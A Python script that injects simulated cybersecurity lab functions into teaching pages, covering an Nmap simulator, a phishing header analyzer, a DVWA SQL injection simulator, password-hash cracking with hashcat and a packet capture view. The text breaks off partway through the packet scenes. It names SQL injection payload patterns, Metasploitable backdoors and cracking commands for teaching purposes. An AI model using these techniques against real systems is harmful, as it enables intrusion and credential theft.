#!/usr/bin/env python3
"""
inject_lab_functions.py
Injects JavaScript simulation functions into 6 cybersecurity lab HTML files.
Skips files that already contain the marker id="cy-lab-fns".
"""

import os
import re

LAB_DIR = "/home/hila/Desktop/NetworksGuide/public/learn/security"
LAB_FILES = [
    "lab_ch01.html",
    "lab_ch02.html",
    "lab_ch03.html",
    "lab_ch04.html",
    "lab_ch05.html",
    "lab_ch06.html",
]
MARKER = 'id="cy-lab-fns"'

# ──────────────────────────────────────────────────────────────────────────────
# THE JAVASCRIPT BLOCK
# ──────────────────────────────────────────────────────────────────────────────
JS_BLOCK = r"""<script id="cy-lab-fns">
/* ═══════════════════════════════════════════════════════════════════════════
   CY-LAB-FNS  v1.0  —  simulation functions for labs ch01-ch06
   ═══════════════════════════════════════════════════════════════════════════ */

/* ── helpers ── */
function escHtml(s){
  return String(s)
    .replace(/&/g,'&amp;')
    .replace(/</g,'&lt;')
    .replace(/>/g,'&gt;')
    .replace(/"/g,'&quot;');
}

function cyC(id){
  var el = document.getElementById(id);
  if(el) el.innerHTML = '<span class="em">cleared.</span>';
}

/* ── animated line printer ── */
function animLines(outId, lines, delay){
  var el = document.getElementById(outId);
  if(!el) return;
  el.innerHTML = '';
  lines.forEach(function(line, i){
    setTimeout(function(){
      el.innerHTML += line + '<br>';
      el.scrollTop = el.scrollHeight;
    }, i * delay);
  });
}

/* ══════════════════════════════════════════════════════════════════════════
   LAB 01 — Nmap Simulator
   ══════════════════════════════════════════════════════════════════════════ */
function cyLab1(){
  var sel = document.getElementById('cy1cmd');
  var btn = document.getElementById('cy1btn');
  var out = document.getElementById('cy1out');
  if(!sel || !btn || !out) return;
  var cmd = sel.value;

  btn.textContent = '⏳ Scanning...';
  btn.classList.add('running');
  btn.disabled = true;
  out.innerHTML = '<span class="dim">Starting Nmap scan...</span>';

  var lines = {
    'sn': [
      '<span class="dim">Starting Nmap 7.94 ( https://nmap.org )</span>',
      '<span class="dim">Nmap scan report for 192.168.1.1</span>',
      '<span class="ok">Host is up</span> <span class="dim">(0.00050s latency)</span>',
      '<span class="dim">MAC Address: C0:FF:EE:11:22:33 (Cisco Systems)</span>',
      '',
      '<span class="dim">Nmap scan report for 192.168.1.105</span>',
      '<span class="ok">Host is up</span> <span class="dim">(0.00071s latency)</span>',
      '<span class="val">MAC Address: 08:00:27:AA:BB:CC (VirtualBox / Metasploitable2)</span>',
      '',
      '<span class="dim">Nmap scan report for 192.168.1.200</span>',
      '<span class="ok">Host is up</span> <span class="dim">(0.00123s latency)</span>',
      '<span class="dim">MAC Address: 00:1A:2B:3C:4D:5E (Unknown)</span>',
      '',
      '<span class="hi">Nmap done: 254 IP addresses (3 hosts up) scanned in 2.47 seconds</span>',
    ],
    'sS': [
      '<span class="dim">Starting Nmap 7.94 — SYN Stealth Scan</span>',
      '<span class="dim">Nmap scan report for 192.168.1.105 (Metasploitable2)</span>',
      '<span class="dim">Not shown: 991 closed tcp ports (reset)</span>',
      '<span class="dim">PORT     STATE SERVICE</span>',
      '<span class="ok">21/tcp   open  ftp</span>',
      '<span class="ok">22/tcp   open  ssh</span>',
      '<span class="ok">23/tcp   open  telnet</span>',
      '<span class="ok">80/tcp   open  http</span>',
      '<span class="ok">139/tcp  open  netbios-ssn</span>',
      '<span class="ok">445/tcp  open  microsoft-ds</span>',
      '<span class="ok">3306/tcp open  mysql</span>',
      '<span class="ok">5432/tcp open  postgresql</span>',
      '<span class="ok">5900/tcp open  vnc</span>',
      '',
      '<span class="hi">Nmap done: 1 IP address (1 host up) scanned in 0.89 seconds</span>',
    ],
    'sV': [
      '<span class="dim">Starting Nmap 7.94 — Service/Version Detection</span>',
      '<span class="dim">Nmap scan report for 192.168.1.105 (Metasploitable2)</span>',
      '<span class="dim">PORT     STATE SERVICE  VERSION</span>',
      '<span class="ok">21/tcp   open  ftp</span>      <span class="val">vsftpd 2.3.4</span>  <span class="err">⚠ CVE-2011-2523: backdoor command execution!</span>',
      '<span class="ok">22/tcp   open  ssh</span>      <span class="dim">OpenSSH 4.7p1 Debian (protocol 2.0)</span>',
      '<span class="ok">23/tcp   open  telnet</span>   <span class="err">Linux telnetd — CLEARTEXT PROTOCOL</span>',
      '<span class="ok">80/tcp   open  http</span>     <span class="val">Apache httpd 2.2.8 ((Ubuntu) DAV/2)</span>',
      '<span class="ok">139/tcp  open  netbios-ssn</span> <span class="dim">Samba smbd 3.X–4.X</span>',
      '<span class="ok">3306/tcp open  mysql</span>    <span class="val">MySQL 5.0.51a-3ubuntu5</span>  <span class="err">⚠ root account has NO password!</span>',
      '<span class="ok">5432/tcp open  postgresql</span> <span class="dim">PostgreSQL DB 8.3.0–8.3.7</span>',
      '<span class="ok">5900/tcp open  vnc</span>      <span class="dim">VNC (protocol 3.3)</span>',
      '',
      '<span class="hi">Service detection performed. Nmap done in 6.13 seconds</span>',
    ],
    'O': [
      '<span class="dim">Starting Nmap 7.94 — OS Detection (requires root)</span>',
      '<span class="dim">Nmap scan report for 192.168.1.105</span>',
      '<span class="dim">Device type: general purpose</span>',
      '<span class="val">Running: Linux 2.6.X</span>',
      '<span class="hi">OS CPE: cpe:/o:linux:linux_kernel:2.6</span>',
      '<span class="dim">OS details: Linux 2.6.9 – 2.6.33</span>',
      '<span class="err">⚠ Kernel 2.6.x — vulnerable to Dirty COW (CVE-2016-5195)</span>',
      '<span class="err">⚠ Local privilege escalation to root in seconds</span>',
      '',
      '<span class="dim">Network Distance: 1 hop</span>',
      '<span class="hi">OS detection performed. Nmap done in 3.77 seconds</span>',
    ],
    'full': [
      '<span class="dim">Starting Nmap 7.94 — Full port scan (1-65535)</span>',
      '<span class="dim">Nmap scan report for 192.168.1.105 (Metasploitable2)</span>',
      '<span class="dim">Not shown: 65511 closed tcp ports</span>',
      '<span class="dim">PORT      STATE  SERVICE</span>',
      '<span class="ok">21/tcp    open   ftp</span>       <span class="err">vsftpd 2.3.4 BACKDOOR</span>',
      '<span class="ok">22/tcp    open   ssh</span>',
      '<span class="ok">23/tcp    open   telnet</span>    <span class="err">CLEARTEXT</span>',
      '<span class="ok">25/tcp    open   smtp</span>',
      '<span class="ok">80/tcp    open   http</span>      <span class="val">Apache 2.2.8 + DVWA</span>',
      '<span class="ok">111/tcp   open   rpcbind</span>',
      '<span class="ok">139/tcp   open   netbios-ssn</span>',
      '<span class="ok">445/tcp   open   microsoft-ds</span>',
      '<span class="ok">512/tcp   open   exec</span>      <span class="err">r-services ENABLED — no auth!</span>',
      '<span class="ok">513/tcp   open   login</span>     <span class="err">r-services ENABLED — no auth!</span>',
      '<span class="ok">514/tcp   open   shell</span>     <span class="err">r-services ENABLED — no auth!</span>',
      '<span class="ok">1099/tcp  open   java-rmi</span>',
      '<span class="ok">1524/tcp  open   ingreslock</span> <span class="err">BACKDOOR SHELL — connects instantly as root!</span>',
      '<span class="ok">2049/tcp  open   nfs</span>',
      '<span class="ok">2121/tcp  open   ftp</span>',
      '<span class="ok">3306/tcp  open   mysql</span>     <span class="err">root — no password</span>',
      '<span class="ok">3632/tcp  open   distccd</span>   <span class="err">CVE-2004-2687 RCE</span>',
      '<span class="ok">5432/tcp  open   postgresql</span>',
      '<span class="ok">5900/tcp  open   vnc</span>',
      '<span class="ok">6000/tcp  open   X11</span>',
      '<span class="ok">6667/tcp  open   irc</span>       <span class="err">UnrealIRCd — BACKDOOR (CVE-2010-2075)</span>',
      '<span class="ok">8009/tcp  open   ajp13</span>',
      '<span class="ok">8180/tcp  open   http</span>      <span class="val">Apache Tomcat 5.5</span>',
      '',
      '<span class="err">⚠ 24 open ports — EXTREMELY VULNERABLE HOST</span>',
      '<span class="hi">Nmap done: 1 IP address scanned in 14.22 seconds</span>',
    ]
  };

  setTimeout(function(){
    btn.textContent = 'Run Scan';
    btn.classList.remove('running');
    btn.disabled = false;
    animLines('cy1out', lines[cmd] || ['<span class="err">unknown command</span>'], 80);
  }, 1400);
}

/* ══════════════════════════════════════════════════════════════════════════
   LAB 02 — Phishing Email Analyzer
   ══════════════════════════════════════════════════════════════════════════ */
var cy2Headers = {
  paypal: [
    'From: "PayPal Security" <security@paypa1-verify.com>',
    'Reply-To: noreply@paypa1-verify.com',
    'To: victim@example.com',
    'Subject: [URGENT] Your account has been limited — verify now',
    'Date: Mon, 24 Mar 2025 03:41:22 +0000',
    'Received-SPF: fail (paypa1-verify.com: domain of paypal.com does not designate)',
    'Authentication-Results: mx.example.com;',
    '   dkim=missing (no signature found)',
    '   spf=fail smtp.mailfrom=security@paypa1-verify.com',
    'X-Mailer: BulkMailer Pro 9.2',
    'X-Originating-IP: 185.220.101.47 (TOR Exit Node)',
    'MIME-Version: 1.0',
    'Content-Type: text/html; charset=UTF-8',
  ].join('\n'),
  ceo: [
    'From: "John Anderson, CEO" <j.anderson@company-corp.com>',
    'Reply-To: johnanderson.ceo@gmail.com',
    'To: finance@company-corp.com',
    'Subject: URGENT: Wire Transfer Required Immediately',
    'Date: Mon, 24 Mar 2025 08:15:03 +0000',
    'Received-SPF: pass (company-corp.com: ...)',
    'Authentication-Results: mx.example.com;',
    '   dkim=pass header.d=company-corp.com',
    '   spf=pass smtp.mailfrom=j.anderson@company-corp.com',
    'X-Priority: 1 (Highest)',
    'X-MS-Exchange-Organization-SCL: 1',
    'MIME-Version: 1.0',
    'Content-Type: text/plain; charset=UTF-8',
  ].join('\n'),
  it: [
    'From: "IT Support" <itsupport@company-c0rp.net>',
    'Reply-To: helpdesk@company-c0rp.net',
    'To: allstaff@company-corp.com',
    'Subject: [Action Required] Password Expiry Notice — Reset Now',
    'Date: Mon, 24 Mar 2025 10:22:44 +0000',
    'Received-SPF: softfail (~all) company-c0rp.net',
    'Authentication-Results: mx.example.com;',
    '   dkim=pass header.d=company-c0rp.net',
    '   spf=softfail smtp.mailfrom=itsupport@company-c0rp.net',
    'X-Mailer: Microsoft Outlook 16.0',
    'MIME-Version: 1.0',
    'Content-Type: text/html; charset=UTF-8',
  ].join('\n'),
  legit: [
    'From: "GitHub" <noreply@github.com>',
    'Reply-To: noreply@github.com',
    'To: user@example.com',
    'Subject: [GitHub] Please verify your email address',
    'Date: Mon, 24 Mar 2025 12:00:00 +0000',
    'Received-SPF: pass (github.com: domain of github.com designates 140.82.114.0 as permitted)',
    'Authentication-Results: mx.example.com;',
    '   dkim=pass header.d=github.com header.s=pf2023',
    '   spf=pass smtp.mailfrom=noreply@github.com',
    '   dmarc=pass (p=REJECT) header.from=github.com',
    'MIME-Version: 1.0',
    'Content-Type: multipart/alternative; boundary="----GitHubBoundary"',
  ].join('\n'),
};

function cy2Preview(){
  var sel = document.getElementById('cy2sample');
  var hdr = document.getElementById('cy2hdr');
  if(!sel || !hdr) return;
  hdr.value = cy2Headers[sel.value] || '';
}

function cyLab2(){
  var sel = document.getElementById('cy2sample');
  var out = document.getElementById('cy2out');
  if(!sel || !out) return;
  var sample = sel.value;

  // populate header textarea if empty
  var hdr = document.getElementById('cy2hdr');
  if(hdr && !hdr.value.trim()) hdr.value = cy2Headers[sample] || '';

  out.innerHTML = '<span class="dim">Analyzing headers...</span>';

  var results = {
    paypal: [
      '<span class="hi">═══ EMAIL HEADER ANALYSIS REPORT ═══</span>',
      '',
      '<span class="dim">From:    </span><span class="err">security@paypa1-verify.com</span>',
      '<span class="dim">Subject: </span><span class="val">[URGENT] Your account has been limited</span>',
      '<span class="dim">IP:      </span><span class="err">185.220.101.47  ← TOR Exit Node</span>',
      '',
      '<span class="key">─── Authentication Checks ───</span>',
      '<span class="err">❌  SPF:   FAIL  — sender not authorized for paypa1-verify.com</span>',
      '<span class="err">❌  DKIM:  MISSING — no signature found</span>',
      '<span class="err">❌  DMARC: FAIL</span>',
      '',
      '<span class="key">─── Red Flags ───</span>',
      '<span class="err">❌  Domain typosquat: paypa1-verify.com (1→l substitution)</span>',
      '<span class="err">❌  Sent at 03:41 UTC — off-hours automated blast</span>',
      '<span class="err">❌  Originating from TOR exit node</span>',
      '<span class="err">❌  BulkMailer Pro — mass-phishing tool</span>',
      '<span class="warn">⚠   Urgency language: "URGENT", "limited"</span>',
      '',
      '<span class="dim">Risk Score: </span><span class="err">98 / 100  🔴 PHISHING — PayPal credential harvester</span>',
    ],
    ceo: [
      '<span class="hi">═══ EMAIL HEADER ANALYSIS REPORT ═══</span>',
      '',
      '<span class="dim">From:    </span><span class="val">j.anderson@company-corp.com</span>',
      '<span class="dim">Reply-To:</span><span class="err">johnanderson.ceo@gmail.com</span>',
      '<span class="dim">Subject: </span><span class="val">URGENT: Wire Transfer Required Immediately</span>',
      '',
      '<span class="key">─── Authentication Checks ───</span>',
      '<span class="ok">✅  SPF:   PASS</span>',
      '<span class="ok">✅  DKIM:  PASS  (company-corp.com)</span>',
      '<span class="warn">⚠   DMARC: PASS — but Reply-To mismatch!</span>',
      '',
      '<span class="key">─── Red Flags ───</span>',
      '<span class="err">❌  Reply-To is personal Gmail — replies go to attacker</span>',
      '<span class="err">❌  Wire transfer request — classic BEC pattern</span>',
      '<span class="err">❌  Highest priority flag (X-Priority: 1)</span>',
      '<span class="warn">⚠   "URGENT" + "Immediately" — social engineering pressure</span>',
      '<span class="dim">ℹ   From domain is legitimate — display name spoofing</span>',
      '',
      '<span class="dim">Risk Score: </span><span class="err">91 / 100  🔴 BEC — Business Email Compromise</span>',
    ],
    it: [
      '<span class="hi">═══ EMAIL HEADER ANALYSIS REPORT ═══</span>',
      '',
      '<span class="dim">From:    </span><span class="warn">itsupport@company-c0rp.net</span>',
      '<span class="dim">Subject: </span><span class="val">[Action Required] Password Expiry Notice</span>',
      '',
      '<span class="key">─── Authentication Checks ───</span>',
      '<span class="warn">⚠   SPF:   SOFTFAIL (~all) — not hard-authorized</span>',
      '<span class="ok">✅  DKIM:  PASS  (company-c0rp.net)</span>',
      '<span class="warn">⚠   DMARC: none configured</span>',
      '',
      '<span class="key">─── Red Flags ───</span>',
      '<span class="err">❌  Domain lookalike: company-c0rp.net (o→0 substitution)</span>',
      '<span class="warn">⚠   Password reset link — credential harvesting risk</span>',
      '<span class="warn">⚠   SPF softfail — domain owner does not vouch for sender</span>',
      '<span class="dim">ℹ   DKIM passes on fake domain (attacker controls it)</span>',
      '',
      '<span class="dim">Risk Score: </span><span class="warn">74 / 100  🟡 MEDIUM — Credential Harvesting Attempt</span>',
    ],
    legit: [
      '<span class="hi">═══ EMAIL HEADER ANALYSIS REPORT ═══</span>',
      '',
      '<span class="dim">From:    </span><span class="ok">noreply@github.com</span>',
      '<span class="dim">Subject: </span><span class="dim">Please verify your email address</span>',
      '',
      '<span class="key">─── Authentication Checks ───</span>',
      '<span class="ok">✅  SPF:   PASS  — github.com authorizes 140.82.114.0</span>',
      '<span class="ok">✅  DKIM:  PASS  (github.com, selector: pf2023)</span>',
      '<span class="ok">✅  DMARC: PASS  (policy: REJECT)</span>',
      '',
      '<span class="key">─── Analysis ───</span>',
      '<span class="ok">✅  Domain matches envelope sender exactly</span>',
      '<span class="ok">✅  No Reply-To mismatch</span>',
      '<span class="ok">✅  Sent from official GitHub IP range</span>',
      '<span class="ok">✅  No urgency manipulation language</span>',
      '<span class="ok">✅  DMARC REJECT policy — no spoofing possible</span>',
      '',
      '<span class="dim">Risk Score: </span><span class="ok">3 / 100  🟢 LEGITIMATE — GitHub verification email</span>',
    ],
  };

  setTimeout(function(){
    animLines('cy2out', results[sample] || ['<span class="err">unknown sample</span>'], 60);
  }, 900);
}

/* ══════════════════════════════════════════════════════════════════════════
   LAB 03 — SQL Injection Simulator (DVWA)
   ══════════════════════════════════════════════════════════════════════════ */
function cy3q(val){
  var inp = document.getElementById('cy3in');
  if(inp){ inp.value = val; inp.focus(); }
}

var cy3Users = [
  {id:1, user:'admin',   first:'admin',   last:'admin',    pass:'5f4dcc3b5aa765d61d8327deb882cf99'},
  {id:2, user:'gordon',  first:'Gordon',  last:'Brown',    pass:'e99a18c428cb38d5f260853678922e03'},
  {id:3, user:'1337',    first:'Hack',    last:'Me',       pass:'8d3533d75ae2c3966d7e0d4fcc69216b'},
  {id:4, user:'pablo',   first:'Pablo',   last:'Picasso',  pass:'0d107d09f5bbe40cade3de5c71e9e9b7'},
  {id:5, user:'smithy',  first:'Bob',     last:'Smith',    pass:'5f4dcc3b5aa765d61d8327deb882cf99'},
];

function cyLab3(){
  var inp = document.getElementById('cy3in');
  var lvl = document.getElementById('cy3lvl');
  var out = document.getElementById('cy3out');
  if(!inp || !lvl || !out) return;

  var query = inp.value.trim();
  var level = lvl.value;
  var lines = [];

  if(level === 'high'){
    lines.push('<span class="dim">/* DVWA Security: HIGH — using prepared statements */</span>');
    lines.push('<span class="dim">$stmt = $db->prepare("SELECT * FROM users WHERE user_id = ?");</span>');
    lines.push('<span class="dim">$stmt->bind_param("i", $id);  // integer only</span>');
    lines.push('');
    var num = parseInt(query);
    if(num >= 1 && num <= 5){
      var u = cy3Users[num-1];
      lines.push('<span class="ok">ID: ' + u.id + '  First name: ' + escHtml(u.first) + '  Surname: ' + escHtml(u.last) + '</span>');
    } else {
      lines.push('<span class="warn">No user found for input: ' + escHtml(query) + '</span>');
      lines.push('<span class="ok">✅ Injection attempt blocked by prepared statement</span>');
    }
    animLines('cy3out', lines, 60);
    return;
  }

  // LOW security — vulnerable
  lines.push('<span class="dim">/* DVWA Security: LOW — raw string interpolation */</span>');
  lines.push('<span class="dim">$q = "SELECT * FROM users WHERE user_id = \'' + escHtml(query) + '\'";  ← INJECTABLE</span>');
  lines.push('');

  var q = query.toLowerCase();

  if(/'\s*or\s*'1'\s*=\s*'1|'\s*or\s+1\s*=\s*1/.test(q) || q.includes("' or '1'='1")){
    lines.push('<span class="err">⚠ Authentication bypass detected — dumping all users:</span>');
    lines.push('');
    cy3Users.forEach(function(u){
      lines.push('<span class="ok">ID: ' + u.id + '  First name: ' + u.first + '  Surname: ' + u.last + '</span>');
    });
    lines.push('');
    lines.push('<span class="err">5 rows returned — full table exposed</span>');
  } else if(q.includes('order by')){
    lines.push('<span class="val">Detecting column count via ORDER BY...</span>');
    lines.push('<span class="ok">ORDER BY 1 -- ✅ no error</span>');
    lines.push('<span class="ok">ORDER BY 2 -- ✅ no error</span>');
    lines.push('<span class="err">ORDER BY 3 -- ❌ Unknown column \'3\' in \'order clause\'</span>');
    lines.push('');
    lines.push('<span class="hi">→ Table has 2 columns (user_id, user)</span>');
  } else if(q.includes('union select') && q.includes('table_name')){
    lines.push('<span class="val">UNION-based injection — reading information_schema...</span>');
    lines.push('');
    lines.push('<span class="key">Tables in database dvwa:</span>');
    lines.push('<span class="ok">  guestbook</span>');
    lines.push('<span class="ok">  users</span>');
    lines.push('');
    lines.push('<span class="hi">→ Interesting table found: users</span>');
  } else if(q.includes('union select') && q.includes('password')){
    lines.push('<span class="val">UNION SELECT — extracting user credentials...</span>');
    lines.push('');
    cy3Users.forEach(function(u){
      lines.push('<span class="err">user: ' + u.user + '  |  hash: ' + u.pass + '</span>');
    });
    lines.push('');
    lines.push('<span class="warn">⚠ Hashes are MD5 — crackable with hashcat in seconds</span>');
    lines.push('<span class="warn">⚠ "password" → 5f4dcc3b... → cracked: "password"</span>');
  } else if(/^[1-5]$/.test(query)){
    var u = cy3Users[parseInt(query)-1];
    lines.push('<span class="ok">ID: ' + u.id + '  First name: ' + u.first + '  Surname: ' + u.last + '</span>');
  } else if(query.includes("'")){
    lines.push('<span class="err">You have an error in your SQL syntax;</span>');
    lines.push('<span class="err">check the manual that corresponds to your MySQL server version</span>');
    lines.push('<span class="err">for the right syntax to use near \'\'\'' + escHtml(query.substring(0,20)) + '\' at line 1</span>');
    lines.push('');
    lines.push('<span class="warn">→ Error confirms injection point exists!</span>');
  } else {
    lines.push('<span class="dim">0 results returned.</span>');
  }

  animLines('cy3out', lines, 70);
}

/* ══════════════════════════════════════════════════════════════════════════
   LAB 04 — Password Cracking
   ══════════════════════════════════════════════════════════════════════════ */
var cy4KnownHashes = {
  'password':    {md5:'5f4dcc3b5aa765d61d8327deb882cf99', time:'0.0001s'},
  'password123': {md5:'482c811da5d5b4bc6d497ffa98491e38', time:'0.0003s'},
  '123456':      {md5:'e10adc3949ba59abbe56e057f20f883e', time:'0.0001s'},
  'letmein':     {md5:'0d107d09f5bbe40cade3de5c71e9e9b7', time:'0.0002s'},
  'admin':       {md5:'21232f297a57a5a743894a0e4a801fc3', time:'0.0001s'},
  'qwerty':      {md5:'d8578edf8458ce06fbc5bb76a58c5ca4', time:'0.0001s'},
  'monkey':      {md5:'d0763edaa9d9bd2a9516280e9044d885', time:'0.0002s'},
  'dragon':      {md5:'8621ffdbc5698829397d97767ac13db3', time:'0.0002s'},
};

function cyLab4Hash(){
  var inp = document.getElementById('cy4pw');
  var out = document.getElementById('cy4out');
  if(!inp || !out) return;
  var pw = inp.value.trim();
  if(!pw){ out.innerHTML='<span class="err">Enter a password first.</span>'; return; }

  var known = cy4KnownHashes[pw.toLowerCase()];
  var md5val = known ? known.md5 : Array.from(pw).reduce(function(h,c){return((h<<5)-h+c.charCodeAt(0))|0;},0).toString(16).replace('-','') + 'a3f7b2c1d9e4';
  var sha256hint = '&lt;sha256(' + escHtml(pw) + ')&gt; — use: echo -n "' + escHtml(pw) + '" | sha256sum';
  var bcrypt = '$2b$12$' + btoa(pw).substring(0,22).replace(/[+/=]/g,'X') + 'XXXXXXXXXXXXXXXXXXX'.substring(0,31-btoa(pw).substring(0,22).replace(/[+/=]/g,'X').length);

  var lines = [
    '<span class="hi">─── Password Hashing Results ───</span>',
    '',
    '<span class="dim">Input:   </span><span class="val">' + escHtml(pw) + '</span>',
    '<span class="dim">Length:  </span><span class="dim">' + pw.length + ' characters</span>',
    '',
    '<span class="key">MD5      </span><span class="err">' + md5val.substring(0,32).padEnd(32,'0') + '</span>  <span class="err">← BROKEN: 50B hash/s on GPU</span>',
    '<span class="key">SHA-256  </span><span class="dim">' + sha256hint + '</span>',
    '<span class="key">bcrypt12 </span><span class="ok">' + bcrypt.substring(0,60) + '</span>',
    '',
    '<span class="dim">bcrypt adaptively slow — ~5,000 hash/s (RTX 4090)</span>',
    known
      ? '<span class="err">⚠ This password is in rockyou.txt — it WILL be cracked</span>'
      : '<span class="ok">Not in common password lists (shown hash is illustrative)</span>',
  ];
  animLines('cy4out', lines, 60);
}

function cyLab4Crack(){
  var inp = document.getElementById('cy4pw');
  var out = document.getElementById('cy4out');
  if(!inp || !out) return;
  var pw = inp.value.trim().toLowerCase();

  var known = cy4KnownHashes[pw];
  var lines = [
    '<span class="hi">─── hashcat -a 0 -m 0 hashes.txt rockyou.txt ───</span>',
    '',
    '<span class="dim">Wordlist: rockyou.txt (14,341,564 passwords)</span>',
    '<span class="dim">Algorithm: MD5  |  Speed: ~50 Billion H/s (RTX 4090)</span>',
    '',
  ];

  if(known){
    lines.push('<span class="dim">Progress:  14.3M/14.3M (100.00%)</span>');
    lines.push('<span class="dim">Step 1/3:  testing "123456"...</span>');
    lines.push('<span class="dim">Step 2/3:  testing "password"...</span>');
    lines.push('<span class="dim">Step 3/3:  testing "' + escHtml(pw) + '"...</span>');
    lines.push('');
    lines.push('<span class="err">CRACKED!  ' + known.md5 + '  →  <strong>' + escHtml(pw) + '</strong></span>');
    lines.push('');
    lines.push('<span class="warn">Time to crack (MD5):    ' + known.time + '</span>');
    lines.push('<span class="ok">Time to crack (bcrypt12): ~47 minutes</span>');
    lines.push('<span class="ok">Time to crack (argon2id): ~6 hours</span>');
  } else {
    lines.push('<span class="dim">Running dictionary attack...</span>');
    lines.push('<span class="dim">Progress: 14.3M/14.3M (100.00%)</span>');
    lines.push('');
    lines.push('<span class="ok">Not found in rockyou.txt dictionary.</span>');
    lines.push('');
    lines.push('<span class="dim">Estimating brute-force (MD5, 8+ chars)...</span>');
    lines.push('<span class="warn">8 chars (lowercase): ~3.6 minutes</span>');
    lines.push('<span class="warn">8 chars (mixed+sym):  ~4.2 hours</span>');
    lines.push('<span class="ok">12 chars (mixed+sym): ~centuries (MD5)</span>');
  }

  animLines('cy4out', lines, 70);
}

function cyLab4Speed(){
  var lines = [
    '<span class="hi">─── Hash Algorithm Speed Comparison (RTX 4090) ───</span>',
    '',
    '<span class="dim">Algorithm      Speed          GPU Cracks/s    Rating</span>',
    '<span class="dim">─────────────────────────────────────────────────────</span>',
    '<span class="err">MD5            50,000,000,000 H/s   50B/s       🔴 BROKEN</span>',
    '<span class="err">SHA-1          18,000,000,000 H/s   18B/s       🔴 BROKEN</span>',
    '<span class="warn">SHA-256         8,900,000,000 H/s  8.9B/s       🟡 WEAK FOR PASSWORDS</span>',
    '<span class="warn">SHA-512         3,200,000,000 H/s  3.2B/s       🟡 WEAK FOR PASSWORDS</span>',
    '<span class="ok">bcrypt (cost 10)       20,000 H/s   20K/s       🟢 ACCEPTABLE</span>',
    '<span class="ok">bcrypt (cost 12)        5,000 H/s    5K/s       🟢 RECOMMENDED</span>',
    '<span class="ok">argon2id (m=64MB)       1,200 H/s   1.2K/s      ✅ BEST</span>',
    '',
    '<span class="key">─── Real-World Cracking Time: "password" ───</span>',
    '',
    '<span class="err">rockyou.txt vs MD5:       0.0003 seconds   ← cracked before you blink</span>',
    '<span class="warn">rockyou.txt vs SHA-256:   0.0008 seconds   ← still instant</span>',
    '<span class="ok">rockyou.txt vs bcrypt 12: 47 minutes       ← attacker has time for coffee</span>',
    '<span class="ok">rockyou.txt vs argon2id:  6+ hours        ← not worth it</span>',
    '',
    '<span class="dim">Takeaway: NEVER use MD5/SHA-1/SHA-256 for password storage.</span>',
    '<span class="dim">Use bcrypt(12+) or argon2id with per-user salt.</span>',
  ];
  animLines('cy4out', lines, 55);
}

/* ══════════════════════════════════════════════════════════════════════════
   LAB 05 — Wireshark Packet Capture Simulator
   ══════════════════════════════════════════════════════════════════════════ */
var cy5Running = false;
var cy5Interval = null;
var cy5PacketNum = 0;
var cy5AllPackets = [];

var cy5Scenes = {
  normal: [
    {t:'0.000001', src:'192.168.1.105', dst:'8.8.8.8',         proto:'DNS',  info:'Standard query A github.com'},
    {t:'0.000183', src:'8.8.8.8',       dst:'192.168.1.105',   proto:'DNS',  info:'Standard query response A 140.82.114.4'},
    {t:'0.000412', src:'192.168.1.105', dst:'140.82.114.4',    proto:'TCP',  info:'52341 → 443 [SYN] Seq=0 Win=64240'},
    {t:'0.038291', src:'140.82.114.4',  dst:'192.168.1.105',   proto:'TCP',  info:'443 → 52341 [SYN, ACK] Seq=0 Ack=1'},
    {t:'0.038312', src:'192.168.1.105', dst:'140.82.114.4',    proto:'TCP',  info:'52341 → 443 [ACK] Seq=1 Ack=1'},
    {t:'0.039100', src:'192.168.1.105', dst:'140.82.114.4',    proto:'TLS',  info:'Client Hello (TLSv1.3)'},
    {t:'0.078402', src:'140.82.114.4',  dst:'192.168.1.105',   proto:'TLS',  info:'Server Hello, Certificate, Server Hello Done'},
    {t:'0.078900', src:'192.168.1.105', dst:'140.82.114.4',    proto:'TLS',  info:'Client Key Exchange, Change Cipher Spec'},
    {t:'0.118000', src:'192.168.1.105', dst:'192.168.1.1',     proto:'ARP',  info:'Who has 192.168.1.1? Tell 192.168.1.105'},
    {t:'0.118100', src:'192.168.1.1',   dst:'192.168.1.105',   proto:'ARP',  info:'192.168.1.1 is at c0:ff:ee:11:22:33'},
  ],
  http_login: [
    {t:'0.000001', src:'192.168.1.50',  dst:'192.168.1.105',   proto:'TCP',  info:'54312 → 80 [SYN]'},
    {t:'0.000121', src:'192.168.1.105', dst:'192.168.1.50',    proto:'TCP',  info:'80 → 54312 [SYN, ACK]'},
    {t:'0.000200', src:'192.168.1.50',  dst:'192.168.1.105',   proto:'HTTP', info:'GET /dvwa/login.php HTTP/1.1'},
    {t:'0.012300', src:'192.168.1.105', dst:'192.168.1.50',    proto:'HTTP', info:'HTTP/1.1 200 OK (text/html)'},
    {t:'0.023400', src:'192.168.1.50',  dst:'192.168.1.105',   proto:'HTTP', info:'POST /dvwa/login.php HTTP/1.1 — CREDENTIALS VISIBLE'},
    {t:'0.023401', src:'192.168.1.50',  dst:'192.168.1.105',   proto:'DATA', info:'username=admin&password=password&Login=Login'},
    {t:'0.034500', src:'192.168.1.105', dst:'192.168.1.50',    proto:'HTTP', info:'HTTP/1.1 302 Found — Location: index.php'},
    {t:'0.045600', src:'192.168.1.50',  dst:'192.168.1.105',   proto:'HTTP', info:'GET /dvwa/index.php HTTP/1.1'},
    {t:'0.056700', src:'192.168.1.105', dst:'192.168.1.50',    proto:'HTTP', info:'HTTP/1.1 200 OK — Dashboard loaded'},
  ],
  arp_spoof: [
    {t:'0.000001', src:'192.168.1.105', dst:'ff:ff:ff:ff:ff:ff', proto:'ARP', info:'Who has 192.168.1.1? Tell 192.168.1.105'},
    {t:'0.000100', src:'192.168.1.1',   dst:'192.168.1.105',     proto:'ARP', info:'192.168.1.1 is at c0:ff:ee:11:22:33'},
    {t:'1.003000', src:'DE:AD:BE:EF:CA:FE', dst:'192.168.1.105', proto:'ARP', info:'192.168.1.1 is at DE:AD:BE:EF:CA:FE ← SPOOFED!'},
    {t:'1.003100', src:'DE:AD:BE:EF:CA:FE', dst:'192.168.1.1',   proto:'ARP', info:'192.168.1.105 is at DE:AD:BE:EF:CA:FE ← SPOOFED!'},
    {t:'2.004200', src:'DE:AD:BE:EF:CA:FE', dst:'192.168.1.105', proto:'ARP', info:'192.168.1.1 is at DE:AD:BE:EF:CA:FE (repeat)'},
    {t:'2.004300', src:'DE:AD:BE:EF:CA:FE', dst:'192.168.1.1',   proto:'ARP', info:'192.168.1.105 is at DE:AD:BE:EF:CA:FE (repeat)'},
    {t:'2.100000', src:'192.168.1.105', dst:'192.168.1.1',       proto:'TCP', info:'Traffic now flowing through ATTACKER'},
